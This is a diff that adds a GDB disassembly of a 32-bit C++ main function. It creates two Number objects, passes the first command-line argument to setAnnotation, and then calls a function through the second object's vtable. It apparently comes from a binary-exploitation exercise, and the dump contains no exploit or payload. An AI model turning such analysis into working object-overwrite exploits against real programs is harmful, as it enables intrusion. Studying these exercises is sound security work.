+   0x0804869b <+7>: sub    esp,0x2c
+   0x0804869e <+10>:  cmp    DWORD PTR [ebp+0x8],0x1
+   0x080486a2 <+14>:  jg     0x80486b0 <main+28>
+   0x080486a4 <+16>:  mov    DWORD PTR [esp],0x1
+   0x080486ab <+23>:  call   0x804857c <_exit@plt>
+   0x080486b0 <+28>:  mov    DWORD PTR [esp],0x6c
+   0x080486b7 <+35>:  call   0x80485bc <_Znwj@plt>
+   0x080486bc <+40>:  mov    ebx,eax
+   0x080486be <+42>:  mov    eax,ebx
+   0x080486c0 <+44>:  mov    DWORD PTR [esp+0x4],0x5
+   0x080486c8 <+52>:  mov    DWORD PTR [esp],eax
+   0x080486cb <+55>:  call   0x804879e <_ZN6NumberC1Ei>
+   0x080486d0 <+60>:  mov    DWORD PTR [esp+0x10],ebx
+   0x080486d4 <+64>:  mov    DWORD PTR [esp],0x6c
+   0x080486db <+71>:  call   0x80485bc <_Znwj@plt>
+   0x080486e0 <+76>:  mov    ebx,eax
+   0x080486e2 <+78>:  mov    eax,ebx
+   0x080486e4 <+80>:  mov    DWORD PTR [esp+0x4],0x6
+   0x080486ec <+88>:  mov    DWORD PTR [esp],eax
+   0x080486ef <+91>:  call   0x804879e <_ZN6NumberC1Ei>
+   0x080486f4 <+96>:  mov    DWORD PTR [esp+0x14],ebx
+   0x080486f8 <+100>: mov    eax,DWORD PTR [esp+0x10]
+   0x080486fc <+104>: mov    DWORD PTR [esp+0x18],eax
+   0x08048700 <+108>: mov    eax,DWORD PTR [esp+0x14]
+   0x08048704 <+112>: mov    DWORD PTR [esp+0x1c],eax
+   0x08048708 <+116>: mov    eax,DWORD PTR [ebp+0xc]
+   0x0804870b <+119>: add    eax,0x4
+   0x0804870e <+122>: mov    eax,DWORD PTR [eax]
+   0x08048710 <+124>: mov    DWORD PTR [esp+0x4],eax
+   0x08048714 <+128>: mov    eax,DWORD PTR [esp+0x18]
+   0x08048718 <+132>: mov    DWORD PTR [esp],eax
+   0x0804871b <+135>: call   0x80487b6 <_ZN6Number13setAnnotationEPc>
+   0x08048720 <+140>: mov    eax,DWORD PTR [esp+0x1c]
+   0x08048724 <+144>: mov    eax,DWORD PTR [eax]
+   0x08048726 <+146>: mov    edx,DWORD PTR [eax]
+   0x08048728 <+148>: mov    eax,DWORD PTR [esp+0x18]
+   0x0804872c <+152>: mov    DWORD PTR [esp+0x4],eax
+   0x08048730 <+156>: mov    eax,DWORD PTR [esp+0x1c]
+   0x08048734 <+160>: mov    DWORD PTR [esp],eax
+   0x08048737 <+163>: call   edx
+   0x08048739 <+165>: add    esp,0x2c
+   0x0804873c <+168>: pop    ebx
+   0x0804873d <+169>: mov    esp,ebp
+   0x0804873f <+171>: pop    ebp
+   0x08048740 <+172>: ret    
+End of assembler dump.
+
